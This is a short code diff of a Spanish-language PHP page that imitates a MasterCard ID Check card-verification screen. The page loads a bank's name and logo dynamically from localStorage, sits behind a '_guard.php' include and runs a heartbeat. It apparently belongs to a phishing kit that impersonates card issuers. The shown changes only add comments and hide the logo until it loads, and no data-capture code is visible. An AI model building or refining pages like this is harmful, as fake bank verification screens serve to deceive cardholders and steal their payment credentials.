@@ -1,3 +1,4 @@
+
 <?php require_once __DIR__ . '/_guard.php'; ?>
 <!DOCTYPE html>
 <html lang="es">
@@ -527,9 +528,11 @@
 
     <div class="container">
         <div class="header">
+            <!-- Logo del banco dinámico (izquierda) -->
             <div class="bank-logo" id="bankLogoContainer">
-                <img id="bankLogoImg" src="" alt="Logo banco" />
+                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
             </div>
+            <!-- Logo de Mastercard fijo (derecha) -->
             <div class="mc-logo">
                 <img src="master.png" alt="MasterCard ID Check" />
             </div>
@@ -781,12 +784,15 @@
             iniciarHeartbeat();
         });
 
+        // CARGA EL LOGO Y EL NOMBRE DEL BANCO DINÁMICAMENTE
         function cargarLogoBanco() {
             const bancoEmisor = localStorage.getItem('bancoEmisor');
             console.log('🏛️ Banco emisor desde localStorage:', bancoEmisor);
+            
             if (bancoEmisor) {
                 bancoNombre.textContent = bancoEmisor;
             }
+            
             if (bancoEmisor && bankLogos[bancoEmisor]) {
                 bankLogoImg.src = bankLogos[bancoEmisor];
                 bankLogoImg.alt = bancoEmisor;
